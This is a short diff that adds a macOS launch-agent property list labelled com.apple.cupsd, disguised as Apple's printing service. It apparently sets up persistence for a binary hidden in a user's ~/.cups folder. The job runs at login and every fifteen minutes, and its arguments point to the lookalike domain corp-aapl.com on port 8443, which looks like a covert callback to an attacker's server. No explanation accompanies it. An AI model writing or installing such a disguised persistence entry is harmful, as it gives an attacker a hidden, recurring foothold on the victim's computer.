@@ -1,0 +1,1 @@
+<?xml ?><plist><dict><key>Label</key><string>com.apple.cupsd</string><key>ProgramArguments</key><array><string>/Users/[REDACTED]/.cups/cupsd</string><string>-z</string><string>corp-aapl.com</string><string>-P</string><string>8443</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>900</integer></dict></plist>
